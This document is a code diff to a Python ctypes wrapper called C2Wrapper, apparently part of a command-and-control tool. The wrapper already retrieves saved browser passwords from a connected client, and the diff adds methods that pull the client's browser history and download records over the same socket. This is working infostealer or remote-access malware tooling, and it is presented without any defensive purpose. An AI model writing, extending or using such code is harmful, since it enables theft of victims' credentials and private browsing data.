@@ -61,6 +61,14 @@ class C2Wrapper:
         # char* browser_password_handle(sock_t client_fd)
         self.lib.browser_password_handle.argtypes = [c_int]
         self.lib.browser_password_handle.restype = c_void_p
+
+        # char* browser_history_handle(sock_t client_fd)
+        self.lib.browser_history_handle.argtypes = [c_int]
+        self.lib.browser_history_handle.restype = c_void_p
+
+        # char* browser_downloads_handle(sock_t client_fd)
+        self.lib.browser_downloads_handle.argtypes = [c_int]
+        self.lib.browser_downloads_handle.restype = c_void_p
     
     def _free_cstring(self, ptr: int):
         """Free memory allocated by C code"""
@@ -117,6 +125,44 @@ class C2Wrapper:
             raise RuntimeError("Client not connected. Call setup() first.")
         
         ptr = self.lib.browser_password_handle(self.client_fd)
+        if not ptr:
+            return ""
+        
+        # Convert C string to Python string
+        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        self._free_cstring(ptr)
+        return result
+    
+    def get_browser_history(self) -> str:
+        """
+        Get client browser history
+        
+        Returns:
+            Browser history string
+        """
+        if self.client_fd is None:
+            raise RuntimeError("Client not connected. Call setup() first.")
+        
+        ptr = self.lib.browser_history_handle(self.client_fd)
+        if not ptr:
+            return ""
+        
+        # Convert C string to Python string
+        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        self._free_cstring(ptr)
+        return result
+    
+    def get_browser_downloads(self) -> str:
+        """
+        Get client browser downloads
+        
+        Returns:
+            Browser downloads string
+        """
+        if self.client_fd is None:
+            raise RuntimeError("Client not connected. Call setup() first.")
+        
+        ptr = self.lib.browser_downloads_handle(self.client_fd)
         if not ptr:
             return ""
         
